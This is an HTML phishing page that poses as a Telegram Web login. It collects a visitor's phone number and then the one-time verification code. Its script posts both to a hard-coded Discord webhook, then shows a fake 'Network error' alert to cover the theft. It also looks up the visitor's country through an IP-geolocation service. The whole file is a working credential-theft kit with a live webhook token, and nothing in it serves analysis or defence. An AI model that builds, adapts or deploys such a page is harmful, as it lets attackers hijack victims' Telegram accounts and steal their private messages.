<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <script src="https://telegram.org/js/telegram-widget.js?22" async></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
</head>
<body>
    <!-- Page 1: Phone Number Input -->
    <div id="phone_page">
        <h3>Enter your phone number:</h3>
        <input type="text" id="phone_input" placeholder="+1234567890">
        <button onclick="submitPhone()">Next</button>
    </div>
    
    <!-- Page 2: Code Verification -->
    <div id="code_page" style="display:none;">
        <h3>Enter verification code:</h3>
        <input type="text" id="code_input" placeholder="12345">
        <button onclick="submitCode()">Verify</button>
    </div>

    <script>
        // Detect country and set language
        function detectLanguage() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const country = data.country_code;
                    const languages = {
                        'RU': 'ru', 'UA': 'uk', 'BY': 'be', 'KZ': 'kk',
                        'US': 'en', 'GB': 'en', 'DE': 'de', 'FR': 'fr', 
                        'ES': 'es', 'CN': 'zh', 'TR': 'tr', 'IR': 'fa'
                    };
                    const lang = languages[country] || 'en';
                    document.documentElement.lang = lang;
                });
        }
        
        detectLanguage();

        function submitPhone() {
            const phone = document.getElementById('phone_input').value;
            
            // Store phone and send to Discord
            localStorage.setItem('captured_phone', phone);
            sendToDiscord(`üì± Phone Number: ${phone}`);
            
            // Show code page
            document.getElementById('phone_page').style.display = 'none';
            document.getElementById('code_page').style.display = 'block';
        }

        function submitCode() {
            const code = document.getElementById('code_input').value;
            const phone = localStorage.getItem('captured_phone');
            
            // Send both phone and code to Discord
            sendToDiscord(`üîê Verification Code: ${code} for phone: ${phone}`);
            
            // Clear data and show fake error
            localStorage.removeItem('captured_phone');
            alert('Network error. Please try again later.');
        }

        function sendToDiscord(message) {
            const webhookURL = 'https://discord.com/api/webhooks/1433943318655533137/Kzh_wiYOIrTbQ73EY_YBntUZJWVI0egaut5C2kjph65JLS-_TGSqdL0jVzw9whatoex-';
            
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: message,
                    username: 'Telegram Login',
                    avatar_url: 'https://telegram.org/img/t_logo.png'
                })
            });
        }
    </script>
</body>
</html>
